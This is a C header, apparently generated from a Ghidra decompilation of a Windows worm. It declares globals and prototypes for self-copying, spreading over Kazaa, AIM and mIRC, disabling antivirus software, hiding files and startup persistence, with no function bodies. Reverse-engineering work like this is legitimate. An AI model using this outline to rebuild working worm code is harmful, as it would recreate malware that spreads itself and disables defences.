/* Auto-generated Header from Symbol Database */
#ifndef DATA_GLOBALS_H
#define DATA_GLOBALS_H

#ifndef WIN32_LEAN_AND_MEAN
#define WIN32_LEAN_AND_MEAN
#endif

#include <stdint.h>
#include <windows.h>
#include <stdbool.h>
#include <shellapi.h>
#include <direct.h>   // for _chdir
#include <stdlib.h>   // for system
#include <stdio.h>   // for FILE
#define MAX_LOADSTRING 100
#define MAX_PATH 260
// --- GHIDRA DECOMPILER SHIM ---
typedef unsigned char      undefined1;
typedef unsigned short     undefined2;
typedef uint32_t           undefined4;
typedef uint64_t           undefined8;
typedef unsigned char      byte;
typedef unsigned int       uint;
typedef unsigned short     ushort;
typedef unsigned long      ulong;
typedef void               code;

// --- CUSTOM DATA TYPES ---

// --- GLOBAL VARIABLES ---
extern uint32_t DAT_0040a000;
extern uint32_t DAT_00414710;
extern uint32_t DAT_00414714;
extern uint32_t DAT_00414718;
extern uint32_t DAT_0041471c;
extern uint32_t DAT_00414720;
extern uint32_t DAT_00414724;
extern uint32_t DAT_00414728;
extern uint32_t DAT_0041472c;
extern uint32_t DAT_00414730;
extern uint32_t DAT_00414734;
extern uint32_t DAT_00414738;
extern uint32_t DAT_0041b030;
extern uint32_t DWORD_0041a004;
extern uint32_t DWORD_0041a00c;
extern uint32_t DWORD_0041a018;
extern uint32_t DWORD_0041a020;
extern uint8_t _L0NEInc[32256];


// --- Global variables (used by the worm) ---
extern char _VirusPath[MAX_PATH];
extern char _windir[MAX_PATH];
extern char _windoze2[MAX_PATH + 12];   // for path + filename
extern char _sysdoze2[MAX_PATH + 12];
extern HKEY _hKey;
extern unsigned char _Kazaa[1024];
extern char _KazaaFull[MAX_PATH + 50];
extern char _AimFull[MAX_PATH + 50];
extern unsigned char _winreg[260];
extern unsigned char _sysreg[260];
extern char _L0NEPath[MAX_PATH + 12];
extern int _e;
extern DWORD _mIrcPath;
extern FILE *Batz;
extern char _szWindowClass[MAX_LOADSTRING];
extern HWND _hWnd;
extern HINSTANCE _hInst;
extern char _windoze[MAX_PATH + 12];
extern char _sysdoze[MAX_PATH + 12];
extern char _szTitle[MAX_LOADSTRING];

// --- Function prototypes missing ---
void _WriteBatch(void);          // or WriteBatch if you rename

// --- REFACTORED FUNCTION PROTOTYPES ---
void _CopyVirus(void);
void _DestroyAVs(void);
void _FindAIM(void);
void _FindmIRC(void);
void _GetVirus(void);
void _HideFiles(void);
void _MyRegisterClass(HINSTANCE param_1);
void _P2PCopy(void);
void _WinStartup(void);
LRESULT _WndProc_16(HWND hWnd, UINT msg, WPARAM wParam, LPARAM lParam);
BOOL _InitInstance(HINSTANCE hInstance, int nCmdShow);


#endif // DATA_GLOBALS_H
